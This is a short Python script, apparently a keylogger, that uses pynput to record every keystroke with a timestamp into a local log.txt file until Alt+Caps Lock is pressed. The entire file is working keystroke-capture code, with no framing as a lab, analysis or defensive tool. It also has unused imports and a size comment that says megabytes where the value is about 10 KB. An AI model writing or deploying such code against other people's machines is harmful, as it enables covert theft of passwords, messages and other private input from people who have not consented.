import time
import os
import subprocess
import sys
from pynput import keyboard

FILENAME = "log.txt"
# maximum file size in MB to be read
MAXFILESIZE = 10 * 1024
REPEATTIME = 3600

pressedKeys = set()

def on_press(key):
    pressedKeys.add(key)

    if ((keyboard.Key.alt_l in pressedKeys or keyboard.Key.alt_r in pressedKeys) 
            and keyboard.Key.caps_lock in pressedKeys):
        return False
    
    # append if the file exists and smaller than specified size, otherwise overwrite it.
    lastKeyPressedTimeString = time.strftime("%Y-%m-%d %H:%M:%S")
    if (os.path.isfile(FILENAME) and os.path.getsize(FILENAME) <= MAXFILESIZE):
        flag = "a"
    else:
        flag = "w"
    with open(FILENAME, flag) as f:
        lastKeyPressedTimeString = time.strftime("%Y-%m-%d %H:%M:%S")
        try:
            f.write(f"{key.char} pressed at {lastKeyPressedTimeString}\n")
        except AttributeError:
            # for non-ascii characters
            f.write(f"{key.name} pressed at {lastKeyPressedTimeString}\n")

def on_release(key):
    pressedKeys.remove(key)
    
try:    
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except KeyboardInterrupt:
    print("interrupted")